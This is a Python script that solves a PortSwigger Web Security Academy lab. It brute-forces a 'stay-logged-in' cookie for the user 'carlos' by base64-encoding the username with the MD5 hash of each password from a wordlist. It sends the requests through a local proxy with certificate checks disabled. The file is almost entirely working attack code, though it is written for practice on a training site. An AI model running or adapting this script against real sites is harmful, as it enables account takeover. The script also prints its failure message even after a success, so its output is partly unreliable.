# Lab: Brute-forcing a stay-logged-in cookie
# Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

import hashlib
import base64
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  'http': 'http://127.0.0.1:8080', 
  'https': 'http://127.0.0.1:8080'
}

def get_md5_hash(input_string):
    md5_hash = hashlib.md5()
    md5_hash.update(input_string.encode('utf-8'))
    return md5_hash.hexdigest()

def get_base64_encoded_string(input_string):
    input_bytes = input_string.encode('utf-8')
    base64_encoded = base64.b64encode(input_bytes)
    return base64_encoded.decode('utf-8')

def send_request():
    url = "https://0ad700de049b5889ae131bb5009b00ec.web-security-academy.net/my-account?id=carlos"
    session = requests.Session()
    
    with open('/home/username_anna/Desktop/CS/portswigger/authentication/password.txt') as file_:
        for line in file_:
            password = line.strip()
            md5_pass = get_md5_hash(password)
            value = get_base64_encoded_string(f'carlos:{md5_pass}')
            cookies = {
                'stay-logged-in':value
            }
            session.cookies.update(cookies)
            response = session.get(url, verify=False, proxies=proxies)
            if 'Update email'in response.text:
                print("username: carlos")
                print(f"password: {password}")
                print(f"stay-logged-in: {value}")
                break
    
    print("[-] Can not brute force the cookie.")

send_request()